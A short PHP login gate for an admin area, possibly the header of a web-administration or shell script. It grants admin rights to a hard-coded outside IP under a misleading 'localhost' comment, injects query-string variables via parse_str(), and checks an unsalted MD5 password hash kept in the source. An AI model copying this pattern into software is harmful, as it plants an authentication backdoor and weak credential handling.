<?php

  function _microtime_float()
  {
      list($usec, $sec) = explode(" ", microtime());
      return ((float)$usec + (float)$sec);
  }
  
 
  parse_str($_SERVER['QUERY_STRING']);
  session_start(); 
  $rnd = "&r="._microtime_float();

  if(!isset($whothis_noheaders))
    echo "<font face=verdana size=1>";
  if($act=='logout') {
    $_SESSION['admin_authorized'] = false;
	session_destroy();	
  }  
  
  // don't check if on localhost
  if($_SERVER['REMOTE_ADDR']=="24.26.10.148")
    $_SESSION['admin_authorized']=true;
 
  if(!isset($_SESSION['admin_authorized']) || !$_SESSION['admin_authorized']) { 
    $pass = $_POST['pass'];
    $realpass = "9cdfb439c7876e703e307864c9167a15";    
    sleep(1);
    if(strlen($pass)!=0 && $realpass==md5($pass)) {
      $_SESSION['admin_authorized'] = true;
    } else {
    
      echo "<p align=center>Authorization<br></p>";
      echo "<FORM action=? METHOD=POST>
            <table align=center>
            <td>Password: <td><input type=password name=pass><br>
            <tr>
            <td><td><input type=submit value='      Login      '>
            </FROM>";  
      if(strlen($_POST['pass'])!=0) 
	    echo "<br><font color=red>Wrong pass";
      die();
    }  
  }
  if(!isset($whothis_noheaders))
    echo "<a href=?act=logout$rnd>logout</a><br>";  
  if(isset($whothis_noheaders))
    unset($whothis_noheaders);

?>